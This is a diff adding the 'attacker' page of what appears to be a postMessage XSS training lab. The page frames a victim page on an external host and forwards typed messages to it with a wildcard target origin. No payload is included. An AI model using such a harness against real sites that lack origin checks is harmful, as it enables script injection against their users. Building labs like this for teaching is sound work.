@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PostMessage XSS Lab - Attacker</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+</head>
+ <body>
+    <div class="container mt-5">
+        <h1>PostMessage XSS Lab - Attacker</h1>
+        <p>This page allows you to send a message to the victim page using the input field below.</p>
+        <input id="message" type="text" class="form-control" placeholder="Enter message">
+        <button id="send-button" class="btn btn-primary mt-2">Send Message</button>
+        <iframe id="target-iframe" src="http://zomasec.atwebpages.com/victim.html" style="width: 100%; height: 500px; border: 1px solid #ddd;"></iframe>
+    </div>
+    <!-- <iframe src="http://zomasec.atwebpages.com/victim.html" onload="window.postMessage('zoma', '*');" style="width: 100%; height: 500px; border: 1px solid #ddd;"></iframe> -->
+    <script>
+
+        var iframe = document.getElementById('target-iframe');
+        var sendButton = document.getElementById('send-button');
+        var messageInput = document.getElementById('message');
+
+        // Function to send the message
+        function sendMessage() {
+            var msg = messageInput.value;
+            if (iframe.contentWindow) {
+                iframe.contentWindow.postMessage(msg, '*');
+            }
+        }
+
+        // Set up button click event
+        sendButton.onclick = sendMessage;
+
+        // Optional: Handle iframe load event if needed
+        iframe.onload = function() {
+            console.log("Iframe loaded and ready to receive messages.");
+        };
+    </script>
+</body>
+</html>
